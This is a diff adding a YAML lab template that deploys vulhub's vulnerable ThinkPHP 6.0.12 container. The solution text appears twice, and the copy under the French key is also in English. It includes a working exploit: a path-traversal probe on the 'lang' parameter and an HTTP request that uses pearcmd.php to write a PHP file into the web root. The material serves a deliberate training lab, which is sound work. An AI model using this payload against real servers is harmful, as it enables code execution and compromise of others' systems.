@@ -1,0 +1,107 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-thinkphp-lang-rce
+  name: ThinkPHP Multilingual Local File Inclusion
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - thinkphp
+  description: ThinkPHP — ThinkPHP Multilingual Local File Inclusion (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/thinkphp/lang-rce
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/thinkphp/lang-rce
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - path-traversal
+    - thinkphp
+    difficulty: medium
+    summary: ThinkPHP Multilingual Local File Inclusion
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/thinkphp/lang-rce
+        ThinkPHP is an extremely widely used PHP development framework in China. In the version prior to 6.0.13, a local restricted file inclusion issue exists in `lang` parameter if the developer enable multiple language pack.
+        Although this issue is only allowed to include ".php" file, the attacker is still able to use the "pearcmd.php" to write arbitrary file and execute code in the server.
+        References:
+        - <https://tttang.com/archive/1865/>
+        - <https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp> (about the "pearcmd.php trick")
+        # Vulnerability Environment
+        Execute following command to start a server that is developed by ThinkPHP v6.0.12:
+        $ docker compose up -d
+        After the server is started, browse the `http://your-ip:8080` to see the default welcome page of ThinkPHP.
+        # Exploit
+        Firstly, because the multiple language feature is not enabled by default, you can try to include the `public/index.php` to determine whether the vulnerability exists:
+        $ http://localhost:8080/?lang=../../../../../public/index
+        The vulnerability exists if the server crashed and a 500 error response comes back.
+        Then, try to write data through "/usr/local/lib/php/pearcmd.php":
+        $ GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
+        $ Host: localhost:8080
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        If the server response the output of pearcmd, which means the exploit is successful:
+        As you can see, the `shell.php` is written in root directory of web:
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/thinkphp/lang-rce
+        ThinkPHP is an extremely widely used PHP development framework in China. In the version prior to 6.0.13, a local restricted file inclusion issue exists in `lang` parameter if the developer enable multiple language pack.
+        Although this issue is only allowed to include ".php" file, the attacker is still able to use the "pearcmd.php" to write arbitrary file and execute code in the server.
+        References:
+        - <https://tttang.com/archive/1865/>
+        - <https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp> (about the "pearcmd.php trick")
+        # Vulnerability Environment
+        Execute following command to start a server that is developed by ThinkPHP v6.0.12:
+        $ docker compose up -d
+        After the server is started, browse the `http://your-ip:8080` to see the default welcome page of ThinkPHP.
+        # Exploit
+        Firstly, because the multiple language feature is not enabled by default, you can try to include the `public/index.php` to determine whether the vulnerability exists:
+        $ http://localhost:8080/?lang=../../../../../public/index
+        The vulnerability exists if the server crashed and a 500 error response comes back.
+        Then, try to write data through "/usr/local/lib/php/pearcmd.php":
+        $ GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
+        $ Host: localhost:8080
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        If the server response the output of pearcmd, which means the exploit is successful:
+        As you can see, the `shell.php` is written in root directory of web:
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_80
+    group:
+      fr: Accès
+      en: Access
+    label: web 80/tcp
+    type: port
+    default: 8080
+services:
+  web:
+    role: main
+    image: vulhub/thinkphp
+    tag: 6.0.12@sha256:c0b7769df81e50921b80d1647622d9f398c5bd11c4d39e5ce7c0b43bdfbd5a9e
+    frozen: true
+    ports:
+    - container: 80
+      host: '{{ form.port_80 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
